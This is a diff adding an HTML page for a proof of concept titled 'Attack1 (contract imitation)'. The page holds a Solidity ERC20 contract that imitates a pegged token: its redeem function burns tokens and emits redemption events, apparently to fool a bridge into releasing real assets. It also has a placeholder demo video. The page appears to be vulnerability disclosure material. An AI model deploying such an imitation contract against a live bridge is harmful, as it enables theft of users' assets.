@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack1 (contract imitation)  </title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        h1 { color: navy; }
+        .section { margin-bottom: 20px; }
+        .code-block { background-color: #f4f4f4; padding: 10px; }
+        .section img, .section video, .section iframe { width: 100%; max-width: 600px; height: auto; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Attack1 (contract imitation)</h1>
+
+    <div class="section">
+        <h2>POC Code</h2>
+        <pre class="code-block"><code>
+            pragma solidity ^0.8.0;
+
+            import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/audit/2023-03/contracts/token/ERC20/ERC20.sol";
+            
+            contract PToken is ERC20 {
+                address public adminOperator;
+            
+                event Redeem(
+                    address indexed redeemer,
+                    uint256 value,
+                    string underlyingAssetRecipient
+                );
+            
+                constructor(
+                    string memory tokenName,
+                    string memory tokenSymbol,
+                    address defaultAdmin
+                ) ERC20(tokenName, tokenSymbol) {
+                }
+            
+                function redeem(uint256 amount, string memory underlyingAssetRecipient) public {
+                    _burn(_msgSender(), amount);
+                    emit Redeem(_msgSender(), amount, underlyingAssetRecipient);
+                }
+            
+            
+            }
+            
+        </code></pre>
+    </div>
+
+    <div class="section">
+        <h2>Demo Video</h2>
+        <video controls>
+            <source src="demo-video.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+
+        <!-- <iframe src="https://www.youtube.com/embed/" frameborder="0" allowfullscreen></iframe> -->
+    </div>
+</body>
+</html>
